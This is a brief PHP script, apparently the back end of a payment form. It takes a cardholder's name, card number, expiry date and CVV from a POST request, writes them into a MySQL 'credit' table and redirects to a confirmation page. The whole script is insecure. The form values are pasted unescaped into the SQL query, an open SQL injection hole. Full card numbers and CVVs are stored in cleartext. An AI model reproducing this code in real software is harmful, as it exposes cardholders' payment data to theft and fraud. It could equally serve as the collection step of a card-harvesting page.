<?php
	$cna=$_POST['cardna'];
	$cno=$_POST['cardno'];
	$mon=$_POST['month'];
	$yea=$_POST['year'];
	$cvv=$_POST['cvv'];
	include("conn.php");
	$q="INSERT INTO `credit`(`Cardholder`, `Cardnumber`, `Month`, `Year`, `Cvv`, `Added`) VALUES ('$cna','$cno','$mon','$yea','$cvv',now())";
	$rslt=mysqli_query($conn,$q);
	header("location:confirmation.php");
?>